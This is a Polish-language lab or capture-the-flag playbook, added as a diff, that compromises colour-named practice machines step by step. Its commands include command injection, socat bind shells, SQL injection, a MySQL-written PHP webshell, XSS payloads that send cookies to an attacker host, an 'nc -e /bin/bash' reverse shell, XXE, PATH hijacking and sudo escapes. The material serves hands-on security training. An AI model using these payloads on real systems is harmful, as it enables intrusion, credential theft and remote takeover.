@@ -1,0 +1,139 @@
+Beginner's Path - Playbook krok po kroku
+White
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.1
+2.	Otwórz http://172.27.27.1, sprawdź źródło HTML (view-source) → login.php
+3.	Zaloguj się: admin / admin
+4.	W panelu wykonaj RCE: id ; ls -la ; ip a
+5.	Na White: socat TCP-LISTEN:11111,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+6.	Na Kali: socat FILE:`tty`,raw,echo=0 TCP:172.27.27.1:11111
+7.	ls -a /home/webadmin ; cat /home/webadmin/.bash_history
+8.	echo 'SecretPassword123' | su -c id
+Deep White
+1.	Na White ustaw socat bind shell i przenieś portable nmap na White (scp z Kali).
+2.	wget https://github.com/ernw/static-toolbox/releases/download/nmap-v7.94SVN/nmap-7.94SVN-x86_64-portable.tar.gz
+3.	scp nmap* webadmin@172.27.27.1:/home/webadmin
+4.	cd /home/webadmin ; tar zxvf nmap*
+5.	./nmap --datadir data -Pn -sT -p- -vv 10.13.37.101
+6.	nc 10.13.37.101 8080 → bind shell
+7.	Sprawdź /var/root → znajdziesz backdoor SUID → odczytaj /root/root.txt
+Yellow
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.2
+2.	Otwórz http://172.27.27.2
+3.	Zaloguj się domyślnym hasłem dla routera Digicom MICHELANGELO (admin / michelangelo).
+4.	W devtools → ciasteczko debug=false → zmień na true.
+5.	Panel umożliwia ping: spróbuj `;id` → RCE jako www-data.
+6.	Użyj ponownie hasła michelangelo do SSH (admin).
+7.	sudo -l → może używać apt.
+8.	sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
+Deep Yellow
+1.	./nmap --datadir data -Pn -sT -p- -vv 10.13.37.102 (przeniesiony na Yellow)
+2.	Połącz się przez SSH: ssh admin@10.13.37.102 hasło michelangelo
+3.	W /opt znajdź admin (SUID), sprawdź strings lub cat admin.c
+4.	Program sprawdza zahardcode'owane hasło → wpisz je.
+5.	Lub użyj buffer overflow: wpisz >30 znaków (AAAAAAAAAA...), nadpiszesz zmienną admin → root shell.
+Orange
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.3
+2.	http://172.27.27.3 → pusta strona → użyj dirbuster.
+3.	Znajdziesz /backup/validationauthority.php
+4.	Parametr x wykonuje się mimo złego ciasteczka: http://172.27.27.3/backup/validationauthority.php?x=id
+5.	Uzyskaj powłokę (nc/socat).
+6.	W katalogu domowym znajdź id_rsa.
+7.	ssh2john id_rsa > id_rsa.john
+8.	john -w=/usr/share/seclists/Passwords/darkweb2017-top10000.txt id_rsa.john
+9.	Użyj hasła w sudo → root
+Deep Orange
+1.	ssh -i klucz_z_Orange manager@10.13.37.103
+2.	cd /opt ; cat cache.c
+3.	Program używa system("rm -rf /tmp").
+4.	Stwórz fałszywy rm: echo '#!/bin/bash\necho Victory\nbash' > ~/rm ; chmod +x ~/rm
+5.	export PATH=/home/manager:$PATH
+6.	/opt/cache → root shell
+Green
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.4
+2.	http://172.27.27.4 → znajdź panel logowania.
+3.	Zaloguj się admin/admin lub spróbuj XSS (login.php / logs.php).
+4.	XSS payload: <script>location.href='//172.27.27.1/?x='+escape(document.cookie);</script>
+5.	Przejmij cookie admina → zaloguj się jako admin.
+6.	Sprawdź cron (ln -s /etc/shadow logs.txt).
+7.	cat /var/log/archive → hasło roota.
+Deep Green
+1.	./nmap --datadir data -Pn -sT -p- -vv 10.13.37.104 (na Green)
+2.	nc 10.13.37.104 8022 → manual
+3.	Wpisz !bash → shell
+4.	W /opt znajdziesz strcmp.c → zahardcode’owane hasło.
+5.	cat strcmp lub strings strcmp → znajdź hasło.
+6.	./strcmp SUPERHASLO /bin/bash -p → root
+Blue
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.5
+2.	http://172.27.27.5 → domyślna strona Apache.
+3.	Sprawdź certyfikat SSL CN: echo '172.27.27.5 blue.hd' | sudo tee -a /etc/hosts
+4.	https://blue.hd
+5.	Dirbuster → znajdź robots.txt → /personal_data/
+6.	Prześlij jpg z webshellem (exiftool).
+7.	Użyj webshella do RCE.
+8.	Na 127.0.0.1:8080 aplikacja podatna na Path Traversal.
+9.	wget -q -O- 'http://127.0.0.1:8080/?cmd=../personal/personal_data/sample.jpg&x=id'
+Purple
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.6
+2.	https://172.27.27.6
+3.	gobuster vhost -k -u https://purple.hd/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+4.	Dodaj do /etc/hosts: auth.purple.hd
+5.	SQLi login: ' or 1-- x
+6.	SQLi panel: 0 and 0 union select 1,2,'id'-- x
+7.	RCE jako manager.
+8.	Sprawdź grupę lxd → użyj HackTricks → root w kontenerze.
+Deep Purple
+1.	./nmap --datadir data -Pn -sT -p- -vv 10.13.37.106 (na Purple)
+2.	MySQL dane z Purple → mysql -h 10.13.37.106 -u manager -pMedicineExpert purple
+3.	select '<?php system($_GET["x"]); ?>' into dumpfile '/var/www/html/webshell.php';
+4.	wget -q -O- 'http://10.13.37.106/webshell.php?x=id'
+5.	W /opt znajdziesz signal.c → blokuje managera SIGTERM.
+6.	trap '' SIGTERM
+7.	./signal /bin/bash -p
+Gray
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.9
+2.	http://172.27.27.9 → login.php, logs.php
+3.	Użyj XSS payloadu w login.php: <script>location.href='//172.27.27.1/?x='+escape(document.cookie);</script>
+4.	Przejmij cookie admina i zaloguj się.
+5.	Sprawdź cron: ln -s /etc/shadow logs.txt
+6.	cat /var/log/archive → hasło roota.
+Deep Gray
+1.	ssh -D 9050 webadmin@172.27.27.9
+2.	Skonfiguruj proxychains/firefox na Kali.
+3.	Użyj CSRF payloadu jako username na Gray: <script>location.href="//10.13.37.109/admin.php?c=nc%09-e%09/bin/bash%09172.27.27.1%091234";</script>
+4.	Uzyskaj reverse shell.
+5.	W /opt znajdziesz fd → ma otwarty file descriptor.
+6.	Napisz rewind.c do odczytu pliku z fd=3.
+7.	gcc rewind.c -o rewind -static ; ./rewind
+Brown
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.8
+2.	http://172.27.27.8 → podatny parametr t= → path traversal.
+3.	Użyj scheme data: do RCE.
+4.	Template Injection w Smarty → payload z HackTricks.
+5.	Uzyskaj RCE.
+6.	Sprawdź cron → heartbeat.sh uruchamiany co minutę jako root.
+7.	Edytuj cron → dodaj backdoor suid bash.
+Deep Brown
+1.	curl http://10.13.37.108/ -X POST -d '<!DOCTYPE foo [<!ENTITY x SYSTEM "/etc/passwd">]><heartbeat><date>&x;</date></heartbeat>'
+2.	XXE do odczytu ~/.ssh/id_rsa
+3.	Skopiuj klucz → chmod 600 id_rsa → ssh admin@10.13.37.108 -i id_rsa
+4.	W /opt znajdziesz program używający ścieżki względnej.
+5.	cd /home/admin ; ln -s /bin/bash password ; PATH=. /opt/prog
+Red
+1.	sudo nmap -Pn -sV --script "default or vuln" -p- -vv 172.27.27.7
+2.	http://172.27.27.7 → Wordpress.
+3.	wpscan --url http://172.27.27.7/
+4.	msfconsole exploit na WP 5.0 → RCE.
+5.	Przejrzyj wp-config.php → znajdź dane logowania.
+6.	ssh wordmasta@172.27.27.7
+7.	Sprawdź kernel: uname -a
+8.	Użyj exploit suggester + CVE-2021-3156
+Deep Red
+1.	ssh -D 9050 wordmasta@172.27.27.7
+2.	ftp anonymous@10.13.37.107
+3.	Prześlij klucz SSH przez FTP.
+4.	ssh -i id_rsa admin@10.13.37.107
+5.	Sprawdź wersję systemu (FreeBSD).
+6.	Wgraj exploit (scp).
+7.	clang -o exploit 48644.c -lpthread
+8.	./exploit
